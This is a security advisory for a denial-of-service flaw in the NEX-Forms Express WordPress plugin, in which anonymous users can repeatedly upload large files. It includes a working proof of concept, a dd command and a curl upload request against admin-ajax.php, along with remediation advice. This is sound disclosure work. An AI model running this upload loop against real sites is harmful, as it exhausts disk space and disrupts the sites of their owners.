# NEX-Forms Express WP Form Builder 9.2.2 - Unauthenticated Large File Upload Leading to Disk Space Exhaustion

## Summary

NEX-Forms Express WP Form Builder 9.2.2 allows unauthenticated users to submit form requests through the `submit_nex_form` AJAX action. During testing, it was observed that file uploads can be performed without authentication, allowing attackers to repeatedly upload large files up to the maximum size permitted by the WordPress/PHP server configuration.

This may lead to disk space exhaustion and denial of service conditions when abused at scale.

## Affected Version

* NEX-Forms Express WP Form Builder 9.2.2
* Earlier versions may also be affected

## Vulnerability Type

* Unrestricted Resource Consumption
* Unauthenticated File Upload
* Denial of Service (Disk Exhaustion)

## Technical Details

The plugin registers a publicly accessible AJAX endpoint:

```php
add_action('wp_ajax_nopriv_submit_nex_form', 'submit_nex_form');
```

Unauthenticated requests to `admin-ajax.php?action=submit_nex_form` are processed by the plugin. During testing, form submissions containing uploaded PDF files were accepted without requiring authentication.

A 39 MB PDF file was successfully submitted anonymously and the plugin generated new form entries:

```html
<input type="hidden" name="nf_entry_id" value="1">
<input type="hidden" name="nf_entry_id" value="2">
```

The maximum accepted upload size is governed by the WordPress/PHP configuration (`upload_max_filesize` and `post_max_size`). As a result, an attacker can repeatedly upload files up to the configured server limit without authentication.

## Proof of Concept

Create a large test PDF:

```bash
dd if=/dev/zero of=big.pdf bs=1M count=39
```

Upload the file anonymously:

```bash
curl -i -X POST \
"http://TARGET/wp-admin/admin-ajax.php?action=submit_nex_form" \
-F "nex_forms_Id=1" \
-F "nex_forms_upload_file=@./big.pdf;type=application/pdf"
```

Successful uploads create new form entries and may store attacker-controlled files within the WordPress uploads directory.

## Impact

An unauthenticated attacker can repeatedly upload large files to the server, consuming available disk space and potentially causing:

* Storage exhaustion
* Website instability
* Application failures
* Denial of service conditions
* Increased backup and hosting costs

The severity depends on the upload size limits configured by the site administrator and the available storage capacity of the hosting environment.

## Remediation

* Require authentication before processing file uploads.
* Enforce capability checks before accepting uploaded files.
* Implement rate limiting for upload requests.
* Restrict upload sizes independently of PHP configuration.
* Validate and reject unauthenticated upload attempts.
* Monitor and clean orphaned uploaded files.

## Credits

Discovered and reported by Vaibhav Narkhede.
